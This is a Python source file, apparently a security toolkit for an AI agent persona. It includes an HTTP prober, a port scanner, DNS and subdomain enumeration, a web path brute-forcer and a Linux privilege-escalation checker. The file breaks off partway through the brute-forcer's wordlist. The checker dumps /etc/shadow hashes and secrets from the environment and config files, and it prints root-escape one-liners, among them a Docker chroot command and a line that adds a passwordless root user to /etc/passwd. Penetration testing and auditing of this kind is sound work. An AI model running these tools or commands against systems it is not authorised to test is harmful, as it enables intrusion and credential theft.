"""Security-focused tools for Loki.

Loaded automatically when the 'security' persona is active.
No external pip dependencies — pure Python stdlib + optional system tools.
All functions return a plain string (usually JSON) for the model to parse.
"""
import os
import re
import json
import base64
import hashlib
import math
import struct
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import ssl
from datetime import datetime


# ── http_probe ────────────────────────────────────────────────────────────────

def http_probe(url, method='GET', headers=None, data=None,
               follow_redirects=True, timeout=15, verify_ssl=False, **_):
    """Make an HTTP/HTTPS request and return a structured response."""
    import time as _time

    method = (method or 'GET').upper()
    hdrs = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }
    if headers:
        if isinstance(headers, dict):
            hdrs.update(headers)
        elif isinstance(headers, str):
            for line in headers.splitlines():
                if ':' in line:
                    k, _, v = line.partition(':')
                    hdrs[k.strip()] = v.strip()

    body_bytes = None
    if data:
        if isinstance(data, dict):
            body_bytes = urllib.parse.urlencode(data).encode()
            hdrs.setdefault('Content-Type', 'application/x-www-form-urlencoded')
        elif isinstance(data, str):
            body_bytes = data.encode()

    ctx = ssl.create_default_context()
    if not verify_ssl:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    redirect_chain = []
    current_url = url
    final_resp = None
    start = _time.time()
    max_redirects = 10 if follow_redirects else 0

    for _ in range(max_redirects + 1):
        req = urllib.request.Request(current_url, data=body_bytes, headers=hdrs, method=method)
        try:
            resp = urllib.request.urlopen(req, timeout=int(timeout), context=ctx)
        except urllib.error.HTTPError as e:
            resp = e
        except Exception as exc:
            return json.dumps({'error': str(exc), 'url': current_url}, indent=2)

        status = resp.status if hasattr(resp, 'status') else resp.code
        redirect_chain.append({'url': current_url, 'status': status})

        location = resp.headers.get('Location') if hasattr(resp, 'headers') else None
        if follow_redirects and location and status in (301, 302, 303, 307, 308):
            current_url = urllib.parse.urljoin(current_url, location)
            if status in (301, 302, 303):
                method = 'GET'
                body_bytes = None
            continue

        final_resp = resp
        break

    elapsed_ms = int((_time.time() - start) * 1000)

    if final_resp is None:
        return json.dumps({'error': 'too many redirects', 'chain': redirect_chain}, indent=2)

    resp_headers = dict(final_resp.headers) if hasattr(final_resp, 'headers') else {}
    try:
        body_raw = final_resp.read(8192)
    except Exception:
        body_raw = b''
    try:
        body_preview = body_raw.decode('utf-8', errors='replace')
    except Exception:
        body_preview = repr(body_raw[:200])

    result = {
        'status': final_resp.status if hasattr(final_resp, 'status') else final_resp.code,
        'url': current_url,
        'elapsed_ms': elapsed_ms,
        'redirect_chain': redirect_chain[:-1],
        'headers': resp_headers,
        'content_type': resp_headers.get('Content-Type', ''),
        'content_length': resp_headers.get('Content-Length', 'unknown'),
        'body_preview': body_preview[:3000],
    }

    if current_url.startswith('https://'):
        try:
            import socket
            parsed = urllib.parse.urlparse(current_url)
            host = parsed.hostname or ''
            port = parsed.port or 443
            with socket.create_connection((host, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert() or {}
                    result['tls'] = {
                        'version': ssock.version(),
                        'cipher': ssock.cipher()[0] if ssock.cipher() else None,
                        'subject': dict(x[0] for x in cert.get('subject', [])),
                        'issuer': dict(x[0] for x in cert.get('issuer', [])),
                        'not_after': cert.get('notAfter', ''),
                        'san': [v for _, v in cert.get('subjectAltName', [])],
                    }
        except Exception as e:
            result['tls'] = {'error': str(e)}

    return json.dumps(result, indent=2)


# ── encode_decode ─────────────────────────────────────────────────────────────

def encode_decode(data, operation, encoding, **_):
    """Encode or decode data using common formats."""
    import html as _html
    import codecs

    op = (operation or '').lower().strip()
    enc = (encoding or '').lower().strip().replace('-', '').replace('_', '').replace(' ', '')
    is_encode = op in ('encode', 'enc', 'e')

    try:
        if enc == 'base64':
            if is_encode:
                result = base64.b64encode(data.encode()).decode()
            else:
                padded = data + '=' * (-len(data) % 4)
                result = base64.b64decode(padded).decode('utf-8', errors='replace')

        elif enc in ('base64url', 'b64url', 'urlsafe'):
            if is_encode:
                result = base64.urlsafe_b64encode(data.encode()).decode()
            else:
                padded = data + '=' * (-len(data) % 4)
                result = base64.urlsafe_b64decode(padded).decode('utf-8', errors='replace')

        elif enc == 'hex':
            if is_encode:
                result = data.encode().hex()
            else:
                clean = data.replace(' ', '').replace('0x', '').replace('\\x', '')
                result = bytes.fromhex(clean).decode('utf-8', errors='replace')

        elif enc in ('url', 'percent', 'urlencode'):
            if is_encode:
                result = urllib.parse.quote(data, safe='')
            else:
                result = urllib.parse.unquote(data)

        elif enc in ('html', 'htmlentity', 'htmlentities'):
            if is_encode:
                result = _html.escape(data, quote=True)
            else:
                result = _html.unescape(data)

        elif enc in ('rot13', 'caesar13'):
            result = codecs.encode(data, 'rot_13')

        elif enc in ('binary', 'bin'):
            if is_encode:
                result = ' '.join(f'{b:08b}' for b in data.encode())
            else:
                bits = data.replace(' ', '').replace('\n', '')
                result = bytes(
                    int(bits[i:i+8], 2) for i in range(0, len(bits), 8)
                ).decode('utf-8', errors='replace')

        elif enc in ('utf8', 'utf-8', 'unicode'):
            if is_encode:
                result = data.encode('utf-8').hex()
            else:
                result = bytes.fromhex(data.replace(' ', '')).decode('utf-8', errors='replace')

        elif enc in ('htmldec', 'decimal', 'htmldecimal'):
            if is_encode:
                result = ''.join(f'&#{ord(c)};' for c in data)
            else:
                result = re.sub(r'&#(\d+);', lambda m: chr(int(m.group(1))), data)

        else:
            available = 'base64, base64url, hex, url, html, htmldec, rot13, binary, utf8'
            return f"ERROR: unknown encoding '{encoding}'. Available: {available}"

        return json.dumps({
            'operation': op,
            'encoding': encoding,
            'input_length': len(data),
            'result': result,
        }, indent=2)

    except Exception as e:
        return f"ERROR: {e}"


# ── hash_data ─────────────────────────────────────────────────────────────────

def hash_data(data, algorithms=None, **_):
    """Compute one or more hashes of a string."""
    ALL = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
    if not algorithms:
        algs = ALL
    elif isinstance(algorithms, (list, tuple)):
        algs = [a.strip().lower() for a in algorithms]
    else:
        algs = [a.strip().lower() for a in str(algorithms).replace(',', ' ').split()]

    raw = data.encode() if isinstance(data, str) else data
    hashes = {}
    for alg in algs:
        try:
            hashes[alg] = hashlib.new(alg, raw).hexdigest()
        except ValueError:
            hashes[alg] = f'unsupported algorithm: {alg}'

    return json.dumps({'input_length': len(raw), 'hashes': hashes}, indent=2)


# ── identify_hash ─────────────────────────────────────────────────────────────

def identify_hash(hash_string, **_):
    """Identify likely hash algorithm(s) from length and charset."""
    h = hash_string.strip().lower()
    length = len(h)
    is_hex = bool(re.fullmatch(r'[0-9a-f]+', h))
    is_b64 = bool(re.fullmatch(r'[a-zA-Z0-9+/=]+', hash_string.strip()))

    candidates = []
    if is_hex:
        hex_map = {
            8:   [('CRC32', 'high'), ('Adler-32', 'medium')],
            16:  [('MD5 (half)', 'low'), ('LANMAN (half)', 'low')],
            32:  [('MD5', 'high'), ('MD4', 'medium'), ('NTLM', 'medium'), ('LM', 'low')],
            40:  [('SHA-1', 'high'), ('RIPEMD-160', 'medium')],
            48:  [('SHA-224', 'high')],
            64:  [('SHA-256', 'high'), ('BLAKE2s-256', 'medium'), ('Keccak-256', 'low')],
            96:  [('SHA-384', 'high')],
            128: [('SHA-512', 'high'), ('BLAKE2b-512', 'medium'), ('Whirlpool', 'low'), ('Keccak-512', 'low')],
        }
        if length in hex_map:
            candidates.extend(hex_map[length])
        else:
            candidates.append((f'Unknown hex hash ({length} chars / {length*4} bits)', 'low'))

    if is_b64 and not is_hex:
        try:
            decoded_len = len(base64.b64decode(hash_string.strip() + '=='))
            b64_map = {16: 'MD5', 20: 'SHA-1', 28: 'SHA-224', 32: 'SHA-256',
                       48: 'SHA-384', 64: 'SHA-512'}
            if decoded_len in b64_map:
                candidates.append((f'{b64_map[decoded_len]} (base64)', 'high'))
        except Exception:
            pass

    if '$' in hash_string:
        if hash_string.startswith('$2'):
            candidates.insert(0, ('bcrypt', 'high'))
        elif hash_string.startswith('$6$'):
            candidates.insert(0, ('SHA-512crypt (Linux shadow)', 'high'))
        elif hash_string.startswith('$5$'):
            candidates.insert(0, ('SHA-256crypt (Linux shadow)', 'high'))
        elif hash_string.startswith('$1$'):
            candidates.insert(0, ('MD5crypt', 'high'))
        elif hash_string.startswith('$apr1$'):
            candidates.insert(0, ('APR1-MD5 (Apache)', 'high'))

    if not candidates:
        candidates.append(('Unknown — does not match common formats', 'low'))

    return json.dumps({
        'input': hash_string.strip(),
        'length': length,
        'charset': 'hex' if is_hex else ('base64' if is_b64 else 'other'),
        'candidates': [{'algorithm': a, 'confidence': c} for a, c in candidates],
        'hashcat_hint': _hashcat_mode(candidates[0][0]) if candidates else None,
    }, indent=2)


def _hashcat_mode(algo_name):
    modes = {
        'MD5': '-m 0', 'MD4': '-m 900', 'NTLM': '-m 1000', 'LM': '-m 3000',
        'SHA-1': '-m 100', 'SHA-224': '-m 1300', 'SHA-256': '-m 1400',
        'SHA-384': '-m 10800', 'SHA-512': '-m 1700',
        'SHA-512crypt (Linux shadow)': '-m 1800',
        'SHA-256crypt (Linux shadow)': '-m 7400',
        'MD5crypt': '-m 500', 'bcrypt': '-m 3200',
        'APR1-MD5 (Apache)': '-m 1600',
    }
    return modes.get(algo_name, 'unknown — check hashcat --help')


# ── file_entropy ──────────────────────────────────────────────────────────────

def file_entropy(path, **_):
    """Calculate Shannon entropy of a file and detect its type."""
    path = os.path.expanduser(path)
    if not os.path.isfile(path):
        return f"ERROR: file not found: {path}"

    file_size = os.path.getsize(path)
    freq = [0] * 256
    magic = b''

    try:
        with open(path, 'rb') as f:
            magic = f.read(16)
            f.seek(0)
            total = 0
            while True:
                chunk = f.read(65536)
                if not chunk:
                    break
                for byte in chunk:
                    freq[byte] += 1
                total += len(chunk)
    except PermissionError:
        return f"ERROR: permission denied: {path}"
    except Exception as e:
        return f"ERROR: {e}"

    entropy = 0.0
    for count in freq:
        if count > 0:
            p = count / total
            entropy -= p * math.log2(p)

    magic_sigs = [
        (b'\x7fELF',       'ELF executable (Linux)'),
        (b'MZ',            'PE executable (Windows)'),
        (b'\xca\xfe\xba\xbe', 'Mach-O binary (macOS, fat)'),
        (b'\xce\xfa\xed\xfe', 'Mach-O binary (macOS, 32-bit LE)'),
        (b'\xcf\xfa\xed\xfe', 'Mach-O binary (macOS, 64-bit LE)'),
        (b'\x89PNG',       'PNG image'),
        (b'\xff\xd8\xff',  'JPEG image'),
        (b'GIF8',          'GIF image'),
        (b'BM',            'BMP image'),
        (b'PK\x03\x04',   'ZIP / JAR / DOCX / XLSX / APKG archive'),
        (b'\x1f\x8b',     'GZIP compressed'),
        (b'BZh',           'BZIP2 compressed'),
        (b'\xfd7zXZ',     'XZ compressed'),
        (b'7z\xbc\xaf',   '7-Zip archive'),
        (b'\x52\x61\x72\x21', 'RAR archive'),
        (b'%PDF',          'PDF document'),
        (b'%!PS',          'PostScript document'),
        (b'\x25\x50\x44\x46', 'PDF document'),
        (b'\xd0\xcf\x11\xe0', 'MS Office (OLE2) document'),
        (b'SQLite',        'SQLite database'),
        (b'\x7f\x45\x4c\x46', 'ELF (alt)'),
    ]
    file_type = 'unknown binary'
    for sig, label in magic_sigs:
        if magic.startswith(sig):
            file_type = label
            break
    if file_type == 'unknown binary':
        if all(32 <= b < 127 or b in (9, 10, 13) for b in magic[:min(16, len(magic))]):
            file_type = 'text / ASCII'

    if entropy >= 7.8:
        interpretation = 'ENCRYPTED or COMPRESSED — essentially random'
    elif entropy >= 7.0:
        interpretation = 'likely packed/obfuscated or compressed binary'
    elif entropy >= 6.0:
        interpretation = 'binary executable (normal range for ELF/PE)'
    elif entropy >= 4.0:
        interpretation = 'mixed binary/text'
    else:
        interpretation = 'plain text or source code'

    return json.dumps({
        'path': path,
        'size_bytes': file_size,
        'size_human': (f'{file_size / 1024:.1f} KB' if file_size < 1_048_576
                       else f'{file_size / 1_048_576:.2f} MB'),
        'entropy_bits_per_byte': round(entropy, 4),
        'interpretation': interpretation,
        'magic_type': file_type,
        'byte_stats': {
            'null_bytes': freq[0],
            'printable_ascii': sum(freq[i] for i in range(32, 127)),
            'high_bytes_128_255': sum(freq[i] for i in range(128, 256)),
            'unique_byte_values': sum(1 for c in freq if c > 0),
        },
    }, indent=2)


# ── check_linux_privesc ───────────────────────────────────────────────────────

GTFOBINS_SUID = {
    'nmap', 'vim', 'vi', 'nano', 'find', 'bash', 'dash', 'sh', 'zsh',
    'python', 'python2', 'python3', 'python3.6', 'python3.8', 'python3.10',
    'perl', 'perl5', 'ruby', 'lua', 'php', 'php7', 'php8',
    'awk', 'gawk', 'nawk', 'mawk', 'tclsh', 'expect',
    'git', 'ftp', 'scp', 'rsync', 'wget', 'curl',
    'tar', 'zip', 'unzip', '7z', 'gzip', 'bzip2',
    'less', 'more', 'man', 'env', 'tee', 'cp', 'mv',
    'chmod', 'chown', 'dd', 'cat', 'head', 'tail',
    'xxd', 'od', 'hexdump', 'base64', 'openssl',
    'node', 'nodejs', 'npm', 'docker', 'podman',
    'screen', 'tmux', 'strace', 'ltrace', 'gdb',
    'as', 'ld', 'gcc', 'g++', 'make', 'ar',
    'objcopy', 'readelf', 'objdump', 'nm',
    'scp', 'sftp', 'ssh', 'nc', 'netcat', 'ncat',
    'socat', 'tcpdump', 'tshark', 'wireshark',
    'mysql', 'sqlite3', 'psql',
    'journalctl', 'systemctl', 'apt', 'apt-get', 'dpkg', 'pip', 'pip3',
    'ansible', 'puppet', 'chef', 'salt',
    'ruby1', 'ruby2', 'irb', 'jruby',
    'java', 'javac', 'jar',
}


def check_linux_privesc(**_):
    """Run a battery of Linux privilege escalation checks."""

    def run(cmd, timeout=8):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=timeout)
            return r.stdout.strip()
        except Exception:
            return ''

    findings = []
    info = {
        'user': run('id'),
        'hostname': run('hostname -f 2>/dev/null || hostname'),
        'kernel': run('uname -r'),
        'os': run("grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '\"'"),
        'shell': os.environ.get('SHELL', 'unknown'),
        'cwd': os.getcwd(),
        'env_PATH': os.environ.get('PATH', ''),
    }

    # ── sudo ──────────────────────────────────────────────────────────────────
    sudo_out = run('sudo -ln 2>/dev/null')
    if sudo_out:
        sev = 'CRITICAL' if 'NOPASSWD' in sudo_out else 'HIGH'
        detail = ('NOPASSWD sudo rights — no password needed for listed commands'
                  if 'NOPASSWD' in sudo_out else
                  'sudo rights (password required — check with sudo -l after auth)')
        findings.append({'severity': sev, 'category': 'sudo',
                         'detail': detail, 'output': sudo_out[:600]})

    # ── SUID binaries ─────────────────────────────────────────────────────────
    suid_raw = run('find / -perm -4000 -type f 2>/dev/null', timeout=20)
    interesting_suid = []
    all_suid = suid_raw.splitlines()
    for path in all_suid:
        if os.path.basename(path).split('.')[0] in GTFOBINS_SUID:
            interesting_suid.append(path)
    if interesting_suid:
        findings.append({
            'severity': 'HIGH',
            'category': 'suid_gtfobins',
            'detail': f'{len(interesting_suid)} SUID binary/binaries exploitable via GTFOBins',
            'binaries': interesting_suid,
            'gtfobins_url': 'https://gtfobins.github.io/',
        })
    elif all_suid:
        findings.append({
            'severity': 'INFO',
            'category': 'suid_other',
            'detail': f'{len(all_suid)} SUID binaries found (none in GTFOBins list)',
            'binaries': all_suid[:20],
        })

    # ── SGID binaries ─────────────────────────────────────────────────────────
    sgid_raw = run('find / -perm -2000 -type f 2>/dev/null', timeout=20)
    if sgid_raw:
        sgid_interesting = [p for p in sgid_raw.splitlines()
                            if os.path.basename(p).split('.')[0] in GTFOBINS_SUID]
        if sgid_interesting:
            findings.append({
                'severity': 'HIGH',
                'category': 'sgid_gtfobins',
                'detail': f'{len(sgid_interesting)} SGID binary/binaries exploitable via GTFOBins',
                'binaries': sgid_interesting,
            })

    # ── Writable /etc ─────────────────────────────────────────────────────────
    writable_etc = run('find /etc -writable -type f 2>/dev/null')
    if writable_etc:
        files = writable_etc.splitlines()
        sev = 'CRITICAL' if any('/etc/passwd' in f or '/etc/shadow' in f
                                 or '/etc/cron' in f or '/etc/sudoers' in f
                                 for f in files) else 'HIGH'
        findings.append({
            'severity': sev,
            'category': 'writable_etc',
            'detail': f'{len(files)} writable file(s) under /etc',
            'files': files[:30],
        })

    # ── Writable PATH directories ─────────────────────────────────────────────
    ww_path = []
    for d in info['env_PATH'].split(':'):
        if d and os.path.isdir(d):
            try:
                if os.stat(d).st_mode & 0o002:
                    ww_path.append(d)
            except OSError:
                pass
    if ww_path:
        findings.append({
            'severity': 'HIGH',
            'category': 'path_hijack',
            'detail': 'World-writable directories in PATH — PATH hijacking possible',
            'dirs': ww_path,
        })

    # ── Cron ──────────────────────────────────────────────────────────────────
    cron_out = run(
        'cat /etc/crontab 2>/dev/null; '
        'ls -la /etc/cron.d/ 2>/dev/null; '
        'crontab -l 2>/dev/null; '
        'cat /var/spool/cron/crontabs/* 2>/dev/null | head -40'
    )
    if cron_out:
        findings.append({
            'severity': 'INFO',
            'category': 'cron',
            'detail': 'Cron jobs found — check if any script is writable by current user',
            'output': cron_out[:1000],
        })

    # ── Linux capabilities ────────────────────────────────────────────────────
    caps = run('getcap -r / 2>/dev/null', timeout=20)
    if caps:
        dangerous_caps = ['cap_setuid', 'cap_setgid', 'cap_net_raw',
                          'cap_sys_admin', 'cap_dac_override', 'cap_chown']
        cap_lines = caps.splitlines()
        dangerous = [l for l in cap_lines
                     if any(dc in l.lower() for dc in dangerous_caps)]
        findings.append({
            'severity': 'HIGH' if dangerous else 'INFO',
            'category': 'capabilities',
            'detail': f'{len(cap_lines)} binary/binaries with capabilities'
                      + (f'; {len(dangerous)} with dangerous caps' if dangerous else ''),
            'dangerous': dangerous,
            'all': cap_lines[:30],
        })

    # ── Docker socket ─────────────────────────────────────────────────────────
    docker_sock = '/var/run/docker.sock'
    if os.path.exists(docker_sock):
        if os.access(docker_sock, os.W_OK):
            findings.append({
                'severity': 'CRITICAL',
                'category': 'docker_socket',
                'detail': 'Docker socket is writable — trivial root escape',
                'exploit': 'docker run --rm -v /:/mnt alpine chroot /mnt sh',
            })
        else:
            findings.append({
                'severity': 'INFO',
                'category': 'docker_socket',
                'detail': 'Docker socket exists but not writable by current user',
            })

    # ── LXD / LXC group ───────────────────────────────────────────────────────
    groups_out = run('groups')
    if 'lxd' in groups_out or 'lxc' in groups_out:
        findings.append({
            'severity': 'CRITICAL',
            'category': 'lxd_group',
            'detail': 'User is in lxd/lxc group — container escape to root is straightforward',
            'reference': 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation',
        })

    # ── /etc/passwd writable ──────────────────────────────────────────────────
    if os.access('/etc/passwd', os.W_OK):
        findings.append({
            'severity': 'CRITICAL',
            'category': 'passwd_writable',
            'detail': '/etc/passwd is writable — add a root user: '
                      "echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd",
        })

    # ── /etc/shadow readable ──────────────────────────────────────────────────
    if os.access('/etc/shadow', os.R_OK):
        shadow_content = run('cat /etc/shadow 2>/dev/null | grep -v "^$\\|^#" | head -20')
        findings.append({
            'severity': 'CRITICAL',
            'category': 'shadow_readable',
            'detail': '/etc/shadow is readable — password hashes exposed for offline cracking',
            'hashes_preview': shadow_content[:500],
        })

    # ── NFS no_root_squash ───────────────────────────────────────────────────
    nfs_exports = run('cat /etc/exports 2>/dev/null')
    if 'no_root_squash' in nfs_exports:
        findings.append({
            'severity': 'HIGH',
            'category': 'nfs_no_root_squash',
            'detail': 'NFS export with no_root_squash — mount from attacker machine and write SUID binary',
            'exports': nfs_exports[:400],
        })

    # ── Readable SSH private keys ─────────────────────────────────────────────
    ssh_keys = run(
        'find / \\( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" '
        '-o -name "id_dsa" -o -name "*.pem" \\) -type f 2>/dev/null | head -30',
        timeout=15
    )
    if ssh_keys:
        readable = [k for k in ssh_keys.splitlines() if os.access(k, os.R_OK)]
        if readable:
            findings.append({
                'severity': 'HIGH',
                'category': 'ssh_private_keys',
                'detail': f'{len(readable)} readable SSH private key(s) found',
                'keys': readable,
            })

    # ── Secrets in environment variables ─────────────────────────────────────
    secret_patterns = ['password', 'passwd', 'secret', 'token', 'api_key',
                       'apikey', 'credential', 'private_key', 'access_key',
                       'auth', 'bearer', 'jwt', 'database_url']
    env_out = run('env 2>/dev/null')
    secret_vars = []
    for line in env_out.splitlines():
        key = line.split('=')[0].lower()
        if any(p in key for p in secret_patterns):
            secret_vars.append(line[:120])
    if secret_vars:
        findings.append({
            'severity': 'HIGH',
            'category': 'env_secrets',
            'detail': f'{len(secret_vars)} potential secret(s) in environment variables',
            'vars': secret_vars,
        })

    # ── World-writable files with sticky bit off ──────────────────────────────
    ww_files = run('find /tmp /var/tmp /dev/shm -type f -perm -002 2>/dev/null | head -20', timeout=10)
    if ww_files:
        findings.append({
            'severity': 'INFO',
            'category': 'world_writable_files',
            'detail': 'World-writable files in temp directories',
            'files': ww_files.splitlines(),
        })

    # ── Passwords in common config files ─────────────────────────────────────
    config_grep = run(
        'grep -rn --include="*.conf" --include="*.cfg" --include="*.ini" '
        '--include="*.env" --include=".env" -iE "password|passwd|secret|token" '
        '/etc /opt /srv /var/www 2>/dev/null | grep -v "^Binary" | head -20',
        timeout=15
    )
    if config_grep:
        findings.append({
            'severity': 'HIGH',
            'category': 'config_passwords',
            'detail': 'Potential hardcoded credentials in config files',
            'matches': config_grep.splitlines()[:20],
        })

    # ── Interesting running processes ─────────────────────────────────────────
    procs = run('ps aux --no-header 2>/dev/null | grep -v "^root.*\\[" | head -30')
    if procs:
        findings.append({
            'severity': 'INFO',
            'category': 'running_processes',
            'detail': 'Snapshot of running processes (look for DB servers, internal apps, root processes)',
            'output': procs[:1000],
        })

    # ── Sort by severity ──────────────────────────────────────────────────────
    sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'INFO': 3}
    findings.sort(key=lambda x: sev_order.get(x.get('severity', 'INFO'), 9))

    return json.dumps({
        'timestamp': datetime.now().isoformat(timespec='seconds'),
        'context': info,
        'summary': {
            'total_findings': len(findings),
            'critical': sum(1 for f in findings if f['severity'] == 'CRITICAL'),
            'high':     sum(1 for f in findings if f['severity'] == 'HIGH'),
            'info':     sum(1 for f in findings if f['severity'] == 'INFO'),
        },
        'findings': findings,
    }, indent=2)


# ── port_scan ─────────────────────────────────────────────────────────────────

def port_scan(host, ports=None, timeout=1, banner=True, **_):
    """TCP connect scan with optional banner grabbing."""
    import socket

    host = host.strip()
    COMMON = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,
              1433,1723,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017]
    SERVICES = {21:'ftp',22:'ssh',23:'telnet',25:'smtp',53:'dns',80:'http',
                110:'pop3',111:'rpcbind',135:'msrpc',139:'netbios-ssn',
                143:'imap',443:'https',445:'smb',993:'imaps',995:'pop3s',
                1433:'mssql',1723:'pptp',3306:'mysql',3389:'rdp',5432:'postgres',
                5900:'vnc',6379:'redis',8080:'http-alt',8443:'https-alt',
                8888:'jupyter',9200:'elasticsearch',27017:'mongodb'}

    if ports is None:
        port_list = COMMON
    elif isinstance(ports, str):
        port_list = []
        for part in ports.replace(' ','').split(','):
            if '-' in part:
                lo, hi = part.split('-', 1)
                port_list.extend(range(int(lo), int(hi)+1))
            else:
                port_list.append(int(part))
    elif isinstance(ports, (list, tuple)):
        port_list = [int(p) for p in ports]
    else:
        port_list = [int(ports)]

    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        return json.dumps({'error': f'Cannot resolve: {e}', 'host': host}, indent=2)

    open_ports = []
    for port in port_list:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(float(timeout))
        try:
            if sock.connect_ex((ip, port)) == 0:
                entry = {'port': port, 'state': 'open', 'service': SERVICES.get(port, 'unknown')}
                if banner:
                    try:
                        sock.settimeout(2)
                        if port in (80, 8080):
                            sock.sendall(b'HEAD / HTTP/1.0\r\n\r\n')
                        raw = sock.recv(512)
                        entry['banner'] = raw.decode('utf-8', errors='replace').strip()[:200]
                    except Exception:
                        pass
                open_ports.append(entry)
        except Exception:
            pass
        finally:
            sock.close()

    return json.dumps({'host': host, 'ip': ip, 'scanned': len(port_list),
                       'open': len(open_ports), 'results': open_ports}, indent=2)


# ── dns_enum ──────────────────────────────────────────────────────────────────

def dns_enum(domain, record_types=None, wordlist=None, **_):
    """Enumerate DNS records + zone transfer attempt + subdomain brute-force."""
    import socket

    domain = domain.strip().lower()
    rtypes = (['A','AAAA','MX','NS','TXT','CNAME','SOA','SRV']
              if not record_types
              else [r.strip().upper() for r in str(record_types).replace(',',' ').split()])

    def run(cmd, timeout=10):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return r.stdout.strip()
        except Exception:
            return ''

    records = {}
    for rtype in rtypes:
        out = run(f'dig +noall +answer +time=3 {rtype} {domain} 2>/dev/null || '
                  f'host -t {rtype} {domain} 2>/dev/null')
        if out:
            records[rtype] = out.splitlines()

    ns_raw = run(f'dig +noall +answer NS {domain} 2>/dev/null')
    nameservers = re.findall(r'\s+NS\s+(\S+)', ns_raw)
    zone_transfers = {}
    for ns in nameservers[:3]:
        ns = ns.rstrip('.')
        axfr = run(f'dig @{ns} AXFR {domain} +time=5 2>/dev/null', timeout=12)
        if axfr and 'Transfer failed' not in axfr and 'connection refused' not in axfr.lower():
            zone_transfers[ns] = axfr[:2000]

    DEFAULT_SUBS = ['www','mail','ftp','smtp','pop','imap','vpn','admin','api',
                    'dev','staging','test','ns1','ns2','blog','cdn','static',
                    'assets','git','jenkins','ci','jira','gitlab','dashboard',
                    'monitor','intranet','portal','shop','remote','mx','owa']
    subs_to_try = wordlist.split(',') if isinstance(wordlist, str) and wordlist else DEFAULT_SUBS
    found_subs = []
    for sub in subs_to_try:
        fqdn = f'{sub.strip()}.{domain}'
        try:
            ip = socket.gethostbyname(fqdn)
            found_subs.append({'subdomain': fqdn, 'ip': ip})
        except Exception:
            pass

    return json.dumps({'domain': domain, 'records': records,
                       'zone_transfer': zone_transfers or 'AXFR refused',
                       'subdomains': found_subs}, indent=2)


# ── web_fingerprint ───────────────────────────────────────────────────────────

def web_fingerprint(url, **_):
    """Fingerprint web server: tech stack, security headers, cookies, WAF, CORS."""
    raw = http_probe(url, follow_redirects=True, timeout=15)
    try:
        data = json.loads(raw)
    except Exception:
        return raw

    headers = {k.lower(): v for k, v in data.get('headers', {}).items()}
    body = data.get('body_preview', '')
    combined = body + str(headers)

    tech = {}
    if headers.get('server'):
        tech['server'] = headers['server']
    if headers.get('x-powered-by'):
        tech['powered_by'] = headers['x-powered-by']

    CMS = {
        'WordPress':  ['/wp-content/','/wp-includes/','wp-json'],
        'Drupal':     ['Drupal.settings','/sites/default/'],
        'Joomla':     ['/components/com_','Joomla!'],
        'Laravel':    ['laravel_session','XSRF-TOKEN'],
        'Django':     ['csrftoken','__admin_media_prefix__'],
        'Rails':      ['X-Runtime','_session_id'],
        'ASP.NET':    ['X-AspNet-Version','__VIEWSTATE'],
        'Spring':     ['JSESSIONID','X-Application-Context'],
        'Next.js':    ['__NEXT_DATA__','_next/'],
        'Angular':    ['ng-version','ng-app'],
    }
    tech['cms_frameworks'] = [k for k,v in CMS.items() if any(p.lower() in combined.lower() for p in v)]

    SEC_HDRS = {'strict-transport-security':'HSTS','content-security-policy':'CSP',
                'x-frame-options':'X-Frame-Options','x-content-type-options':'XCTO',
                'referrer-policy':'Referrer-Policy','permissions-policy':'Permissions-Policy',
                'cross-origin-opener-policy':'COOP','cross-origin-embedder-policy':'COEP'}
    sec_present = {label: headers[h] for h, label in SEC_HDRS.items() if h in headers}
    sec_missing  = [label for h, label in SEC_HDRS.items() if h not in headers]

    cookies = []
    for key in ('set-cookie','Set-Cookie'):
        v = data.get('headers', {}).get(key, '')
        if v:
            m = re.search(r'samesite=(\w+)', v, re.I)
            cookies.append({'value': v[:200], 'httponly': 'httponly' in v.lower(),
                            'secure': 'secure' in v.lower(),
                            'samesite': m.group(1) if m else None})

    WAF = {'Cloudflare':['cf-ray','cf-cache-status'],'Akamai':['x-check-cacheable','x-akamai'],
           'Imperva':['incap_ses','visid_incap'],'F5':['bigipserver'],'Sucuri':['x-sucuri-id'],
           'AWS WAF':['x-amzn-requestid','awselb'],'ModSecurity':['mod_security']}
    waf_found = [k for k, sigs in WAF.items() if any(s.lower() in str(headers).lower() for s in sigs)]

    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', body, re.I)

    return json.dumps({'url': data.get('url'), 'status': data.get('status'),
                       'technology': tech,
                       'security_headers': {'present': sec_present, 'missing': sec_missing},
                       'cookies': cookies, 'waf': waf_found or 'none detected',
                       'cors': headers.get('access-control-allow-origin'),
                       'forms': forms[:10], 'tls': data.get('tls')}, indent=2)


# ── dir_bruteforce ────────────────────────────────────────────────────────────

def dir_bruteforce(url, wordlist=None, extensions=None, threads=10, timeout=6, **_):
    """Brute-force common web paths using built-in wordlist or custom list."""
    import threading as _th
    from queue import Queue

    base = url.rstrip('/')
    BUILTIN = [
        'admin','login','dashboard','api','api/v1','api/v2','config','backup',
        'uploads','files','static','assets','images','css','js','robots.txt',
        'sitemap.xml','.htaccess','web.config','phpinfo.php','info.php',
        'test.php','.env','.git/HEAD','.git/config','wp-admin','wp-login.php',
        'wp-config.php','manager','administrator','console','panel','control',
        'user','users','account','register','index.php','server-status',
        'phpmyadmin','pma','database','db','backup.sql','backup.zip',
